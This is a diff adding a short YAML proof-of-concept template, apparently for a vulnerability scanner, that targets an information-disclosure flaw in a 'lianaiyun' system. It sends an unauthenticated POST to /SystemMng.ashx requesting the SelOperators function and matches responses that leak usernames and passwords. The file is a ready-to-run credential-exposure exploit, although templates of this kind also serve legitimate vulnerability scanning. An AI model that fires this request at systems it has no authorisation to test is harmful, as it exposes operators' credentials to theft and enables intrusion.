@@ -1,0 +1,20 @@
+name: poc-yaml-lianaiyun-SystemMng-Information-disclosure
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /SystemMng.ashx
+      headers:
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      body: username=admin&funcName=SelOperators
+    expression: response.status == 200 && response.body.bcontains(b'username') && response.body.bcontains(b'password') && response.body.bcontains(b'"rows":') && response.body.bcontains(b'"[{')
+
+expression: r0() 
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247484636&idx=1&sn=42edc010dceca4c2abf5b7897119fff4&chksm=c267b1eff51038f935a7487a21231ac130214813dbc105b72cb539d502f2c8f2643890a46331&token=1439003696&lang=zh_CN#rd
